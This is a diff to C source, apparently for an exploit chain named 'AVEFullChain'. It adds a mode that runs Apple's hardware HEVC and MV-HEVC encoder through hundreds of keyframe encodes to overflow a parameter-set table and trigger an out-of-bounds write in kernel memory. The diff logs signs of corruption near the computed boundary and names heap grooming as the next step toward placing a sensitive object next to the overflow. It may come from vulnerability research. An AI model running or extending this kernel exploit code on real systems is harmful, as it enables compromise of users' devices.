@@ -3679,6 +3679,168 @@ cleanup_dummies:
         rlog("If any layer count produces scaled pset entries, the overflow\n");
         rlog("threshold of 256 can be reached in fewer encodes.\n");
 
+    } else if (strcmp(mode, "counter_accumulate") == 0) {
+        /*
+         * COUNTER_ACCUMULATE: Critical test based on callgraph analysis.
+         *
+         * Finding: The VPS table constructor (which zeros the counter) runs
+         * ONLY during sAddClient (session creation). The sEncodeFrame path
+         * writes entries WITHOUT resetting the counter. If the IOKit session
+         * persists across VTCompressionSession encode calls, entries accumulate:
+         *   - Standard HEVC: 3 pset entries/keyframe × 86 = 258 → OOB
+         *   - MV-HEVC stereo: 5 entries/keyframe × 52 = 260 → OOB
+         *
+         * This mode encodes N keyframes on a single session and monitors for
+         * ANY sign of kernel memory corruption at the 86+ encode boundary.
+         * Tests both standard HEVC and MV-HEVC stereo paths.
+         */
+        int max_enc = 300;
+        int use_stereo = 0;
+        if (argc > 2) max_enc = atoi(argv[2]);
+        if (argc > 3 && strcmp(argv[3], "stereo") == 0) use_stereo = 1;
+        if (max_enc < 10) max_enc = 10;
+        if (max_enc > 1000) max_enc = 1000;
+
+        rlog("COUNTER_ACCUMULATE: %s HEVC, %d keyframe encodes\n",
+             use_stereo ? "MV-HEVC stereo" : "Standard", max_enc);
+        rlog("Theory: VPS table counter accumulates (constructor only at session create)\n");
+        rlog("OOB boundary: ~86 encodes (standard) or ~52 (stereo)\n\n");
+
+        CFMutableDictionaryRef es = CFDictionaryCreateMutable(
+            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+
+        if (use_stereo) {
+            int hero = 0, nlayers = 2;
+            int layers[] = {0, 1};
+            CFNumberRef ln = CFNumberCreate(NULL, kCFNumberIntType, &nlayers);
+            CFMutableArrayRef la = CFArrayCreateMutable(NULL, nlayers, &kCFTypeArrayCallBacks);
+            for (int i = 0; i < nlayers; i++) {
+                CFNumberRef lv = CFNumberCreate(NULL, kCFNumberIntType, &layers[i]);
+                CFArrayAppendValue(la, lv); CFRelease(lv);
+            }
+            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &hero);
+            CFDictionarySetValue(es, CFSTR("MVHEVCVideoLayerIDs"), la);
+            CFDictionarySetValue(es, CFSTR("MVHEVCViewIDs"), la);
+            CFDictionarySetValue(es, CFSTR("MVHEVCHeroEye"), hn);
+            CFRelease(la); CFRelease(ln); CFRelease(hn);
+        }
+
+        VTCompressionSessionRef s = NULL;
+        OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
+            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
+        CFRelease(es);
+        rlog("Create: %d\n", (int)r);
+        if (r != 0 || !s) goto done;
+
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+        int kf = 1;
+        CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
+        CFRelease(kfn);
+        VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+
+        OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
+        rlog("Prepare: %d\n\n", (int)pr);
+        if (pr != 0) { VTCompressionSessionInvalidate(s); CFRelease(s); goto done; }
+
+        size_t first_pset_count = 0, first_pset_bytes = 0;
+        int first_error_at = -1;
+        int errors = 0;
+        uint64_t prev_time = 0;
+
+        for (int i = 0; i < max_enc; i++) {
+            struct timespec t0, t1;
+            clock_gettime(CLOCK_MONOTONIC, &t0);
+
+            int st;
+            if (use_stereo) {
+                st = encode_one_stereo_kf();
+            } else {
+                st = encode_one(s, i, 128, 128);
+            }
+
+            clock_gettime(CLOCK_MONOTONIC, &t1);
+            uint64_t elapsed_us = (t1.tv_sec - t0.tv_sec) * 1000000ULL +
+                                  (t1.tv_nsec - t0.tv_nsec) / 1000ULL;
+
+            if (st != 0) {
+                if (first_error_at < 0) first_error_at = i;
+                errors++;
+                rlog("[%03d] ERROR %d (elapsed %llu us)\n", i, st, elapsed_us);
+                if (errors > 5) {
+                    rlog("Too many errors, stopping\n");
+                    break;
+                }
+                continue;
+            }
+
+            if (i == 0) {
+                first_pset_count = g_last_pset_count;
+                first_pset_bytes = g_last_pset_total_bytes;
+                rlog("[%03d] baseline: psets=%zu bytes=%zu elapsed=%llu us\n",
+                     i, first_pset_count, first_pset_bytes, elapsed_us);
+            }
+
+            /* Log at key boundaries and periodically */
+            int is_boundary = (i >= 45 && i <= 55) || (i >= 80 && i <= 92) ||
+                              (i >= 150 && i <= 160) || (i >= 250 && i <= 260);
+            int is_periodic = (i % 25 == 0);
+
+            if (is_boundary || is_periodic || i == max_enc - 1) {
+                int estimated_entries = (int)first_pset_count * (i + 1);
+                rlog("[%03d] psets=%zu bytes=%zu elapsed=%llu us (est. table entries: %d%s)\n",
+                     i, g_last_pset_count, g_last_pset_total_bytes, elapsed_us,
+                     estimated_entries,
+                     estimated_entries >= 256 ? " *** OOB ***" : "");
+            }
+
+            /* Detect anomalies: pset count change, timing spike, etc. */
+            if (g_last_pset_count != first_pset_count && i > 0) {
+                rlog("[%03d] *** PSET COUNT CHANGED: %zu → %zu (was %zu) ***\n",
+                     i, first_pset_count, g_last_pset_count, first_pset_count);
+            }
+            if (g_last_pset_total_bytes != first_pset_bytes && i > 0) {
+                int64_t delta = (int64_t)g_last_pset_total_bytes - (int64_t)first_pset_bytes;
+                if (delta != 0 && (is_boundary || i % 25 == 0)) {
+                    rlog("[%03d] PSET BYTES DELTA: %+lld (now %zu, baseline %zu)\n",
+                         i, delta, g_last_pset_total_bytes, first_pset_bytes);
+                }
+            }
+            if (elapsed_us > 100000 && prev_time > 0 && elapsed_us > prev_time * 3) {
+                rlog("[%03d] *** TIMING SPIKE: %llu us (prev %llu) ***\n",
+                     i, elapsed_us, prev_time);
+            }
+            prev_time = elapsed_us;
+        }
+
+        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+        rlog("\n=== COUNTER_ACCUMULATE RESULTS ===\n");
+        rlog("Encodes completed: %d (errors: %d)\n", max_enc, errors);
+        rlog("First error at encode: %d\n", first_error_at);
+        rlog("Per-frame psets: %zu, bytes: %zu\n", first_pset_count, first_pset_bytes);
+        int total_entries = (int)first_pset_count * max_enc;
+        rlog("Estimated total table entries: %d\n", total_entries);
+        rlog("OOB threshold: 256 entries (~%d encodes)\n",
+             first_pset_count > 0 ? (256 / (int)first_pset_count + 1) : 0);
+
+        if (first_error_at >= 80 && first_error_at <= 95 && !use_stereo) {
+            rlog("\n*** ERROR NEAR OOB BOUNDARY (86 encodes) — COUNTER MAY ACCUMULATE ***\n");
+            rlog("*** This suggests the IOKit session persists and entries overflow ***\n");
+        } else if (first_error_at >= 45 && first_error_at <= 60 && use_stereo) {
+            rlog("\n*** ERROR NEAR STEREO OOB BOUNDARY — COUNTER MAY ACCUMULATE ***\n");
+        } else if (errors == 0 && max_enc > 100) {
+            rlog("\nNo errors after %d encodes. Possible explanations:\n", max_enc);
+            rlog("  1. IOKit session recycled per encode (counter resets)\n");
+            rlog("  2. Overflow into unused padding (no visible effect)\n");
+            rlog("  3. VTCompressionSession resets state internally\n");
+            rlog("Next: Try session_reuse_groom to place sensitive object adjacent\n");
+        }
+
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -3714,6 +3876,7 @@ cleanup_dummies:
         rlog("  resolution_probe [unsafe]      -- Test large resolution kernel OOB (CVE-2026-112705 variant)\n");
         rlog("  enum_properties                -- Enumerate ALL supported encoder properties and boundary test\n");
         rlog("  multi_layer [max]              -- MV-HEVC with N layers: measure pset scaling\n");
+        rlog("  counter_accumulate [enc] [stereo] -- KEY TEST: 300 keyframes, monitor kernel OOB at 86+\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
